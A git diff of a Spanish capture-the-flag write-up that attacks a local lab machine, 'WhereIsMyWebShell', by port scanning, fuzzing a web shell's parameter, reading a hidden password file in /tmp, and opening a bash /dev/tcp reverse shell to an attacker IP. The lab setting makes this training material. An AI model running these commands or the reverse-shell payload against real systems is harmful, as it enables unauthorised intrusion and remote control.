@@ -1,11 +1,11 @@
 ### Informe de máquina *"WhereIsMyWebShell"*
 
-![Máquina Psycho](./screenshots/01_maquina.png)
+![Máquina Psycho](../../data/facil/whereismywebshell/screenshots/01_maquina.png)
 
 Vamos a realizar la maquina "Psycho", como siempre vamos a empezar asignando permisos de ejecución al archivo `auto_deploy.sh` eh inicializamos la maquina con `sudo ./autodeploy ` `psycho.tar`
 
-![Permisos ejecución deploy](./screenshots/02_permisos_ejecucion_deploy.png)
-![Inicialización máquina](./screenshots/03_inicializacion_maquina.png)
+![Permisos ejecución deploy](../../data/facil/whereismywebshell/screenshots/02_permisos_ejecucion_deploy.png)
+![Inicialización máquina](../../data/facil/whereismywebshell/screenshots/03_inicializacion_maquina.png)
 
 Realizamos un testeo de conexión con el comando `ping`.
 Y realizamos un escaneo de puertos abiertos con la herramienta `nmap`, el comando usado fue:
@@ -24,55 +24,55 @@ nmap -sS --min-rate 5000 -p- -vvv -Pn -n 172.17.0.2 -oG nmap
 - `172.17.0.2` → IP objetivo a escanear.
 - `-oG nmap` → Guarda los resultados en formato "greppable" en un archivo llamado nmap.
 
-![Test de conexión](./screenshots/04_escaneo_puertos_abiertos.png)
+![Test de conexión](../../data/facil/whereismywebshell/screenshots/04_escaneo_puertos_abiertos.png)
 
-Encontramos que el puerto 80 se encuentrá abierto, realizamos un escaneo más detallado de este puerto.
+Encontramos que el puerto 80 abierto, realizamos un escaneo más detallado de este puerto.
 
-![Escaneo detalle puerto 80](./screenshots/05_escaneo_puerto80.png)
+![Escaneo detalle puerto 80](../../data/facil/whereismywebshell/screenshots/05_escaneo_puerto80.png)
 
 Procedemos a revisar el contenido de la página web.
 
-![Página web](./screenshots/06_pagina_web.png)
-![Código fuente de página web](./screenshots/07_codigo_fuente_pagina.png)
+![Página web](../../data/facil/whereismywebshell/screenshots/06_pagina_web.png)
+![Código fuente de página web](../../data/facil/whereismywebshell/screenshots/07_codigo_fuente_pagina.png)
 
-Casi al final de la página podemos encontrar un mensaje que dice "Guardo un secreto que guardo en /tmp". Guardamos este dato para despues.
+Casi al final de la página podemos encontrar un mensaje que dice "Guardo un secreto que guardo en /tmp". Guardamos este dato para después.
 
 Por ahora realizamos un ataque de fuzzing para encontrar directorios o páginas en el servidor web.
 
-![Ataque de Fuzzing](./screenshots/08_ataque_fuzzing.png)
+![Ataque de Fuzzing](../../data/facil/whereismywebshell/screenshots/08_ataque_fuzzing.png)
 
 Encontramos dos páginas, una "shell.php" y otra "warning.html".
 
-![Web warning](./screenshots/09_web_warning.png)
+![Web warning](../../data/facil/whereismywebshell/screenshots/09_web_warning.png)
 
-En "warning.html" encontramos un mensaje que dice: "...su web shell tiene un parametro que no recuerto...", podemos concluir que la página "shell.php" espera un parametro.
+En "warning.html" encontramos un mensaje que dice: "...su web shell tiene un parámetro que no recuerdo...", podemos concluir que la página "shell.php" espera un parámetro.
 
-![Ejemplo web shell en php](./screenshots/10_ejemplo_codigo_shell_php.png)
+![Ejemplo web shell en php](../../data/facil/whereismywebshell/screenshots/10_ejemplo_codigo_shell_php.png)
 
-Investigando un poco del funcionamiento de una web shell con php, si identificamos el nombre del parametro le podemos mandar una instrucción para que sea ejecutada.
+Investigando un poco del funcionamiento de una web shell con php, si identificamos el nombre del parámetro le podemos mandar una instrucción para que sea ejecutada.
 
-Realizaremos un ataque de fuzzing, donde la página "shell.php" reciba el nombre de un parametro y que ejecute el comando `id`. Haciendo uso de la herramienta `wfuzz`
+Realizaremos un ataque de fuzzing, donde la página "shell.php" reciba el nombre de un parámetro y que ejecute el comando `id`. Haciendo uso de la herramienta `wfuzz`
 
 
 ```bash
 wfuzz -c  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --sc 200 'http://172.17.0.2/shell.php?FUZZ=id'
 ```
 
-![Fuzzing id de web shell](./screenshots/11_id_shell.png)
+![Fuzzing id de web shell](../../data/facil/whereismywebshell/screenshots/11_id_shell.png)
 
 Encontramos que el nombre del parámetro para la ejecución de la web shell es "parameter".
 
-![Acceso a web shell](./screenshots/12_acceso_shell.png)
+![Acceso a web shell](../../data/facil/whereismywebshell/screenshots/12_acceso_shell.png)
 
 Recordando el primer mensaje pista, realizamos un listado de todos los archivos en `/tmp`, recordando que estamos en un navegador debemos remplazar algunos símbolos como `/` o `.`.
-Es decir, para ejecutar el comando `ls -la /tmp` ejecutaremos: `ls -la %2Ftmp`, nos podemos apoyar de algun codificador como [urlencoder](https://www.urlencoder.org/es/)
+Es decir, para ejecutar el comando `ls -la /tmp` ejecutaremos: `ls -la %2Ftmp`, nos podemos apoyar de algún codificador como [urlencoder](https://www.urlencoder.org/es/)
 
 Ejecutamos:
 ```
 172.17.0.2/shell.php?parameter=ls -la %2Ftmp
 ```
 
-![Contenido en tmp](./screenshots/14_ls_tmp.png)
+![Contenido en tmp](../../data/facil/whereismywebshell/screenshots/14_ls_tmp.png)
 
 Identificamos un archivo oculto llamado `.secret.txt`
 Ejecutamos el comando:
@@ -81,17 +81,17 @@ Ejecutamos el comando:
 172.17.0.2/shell.php?parameter=cat %2Ftmp%2F.secret.txt
 ```
 
-![Lectura secret.txt](./screenshots/15_passwd_root.png)
+![Lectura secret.txt](../../data/facil/whereismywebshell/screenshots/15_passwd_root.png)
 
 Encontramos una contraseña al parecer del usuario root.
 Para realizar una mejor ejecución de los comandos vamos a realizar una reverse shell.
 
 Primero empezamos por definir un puerto en escucha en nuestra máquina atacante, en este caso el puerto 4433, con el comando: `sudo nc -lvnp 4433`
 
-![Escucha puerto 4433](./screenshots/16_reverse_shell_listening_port.png)
+![Escucha puerto 4433](../../data/facil/whereismywebshell/screenshots/16_reverse_shell_listening_port.png)
 
 Y en el navegador el comando `bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'` donde `$RHOST` es la ip de nuestra maquina atacante y `$RPORT` es el puerto que definimos para la escucha:
-Compilando este comando y ejecutandolo en el navegador quedaria:
+Compilando este comando y ejecutando en el navegador quedaría:
 
 ```
 172.17.0.2/shell.php?parameter=bash -c 'bash -i >%26 %2Fdev%2Ftcp%2F10.0.2.15%2F4433 0>%261'
@@ -99,12 +99,12 @@ Compilando este comando y ejecutandolo en el navegador quedaria:
 
 En unos segundos, observamos que la terminal donde dejamos en escucha el puerto 4433, se nos iniciará una shell.
 
-![Acceso a terminal](./screenshots/17_acceso_terminal.png)
+![Acceso a terminal](../../data/facil/whereismywebshell/screenshots/17_acceso_terminal.png)
 
 Como revisamos en el archivo `/tmp/.secret.txt` intentamos acceder como usuario `root` con esta contraseña, resultando con éxito.
 
 La contraseña de root era: `contraseñaderoot123`
 
-![Logeo como root](./screenshots/18_acceso_root.png)
+![Logeo como root](../../data/facil/whereismywebshell/screenshots/18_acceso_root.png)
 
 
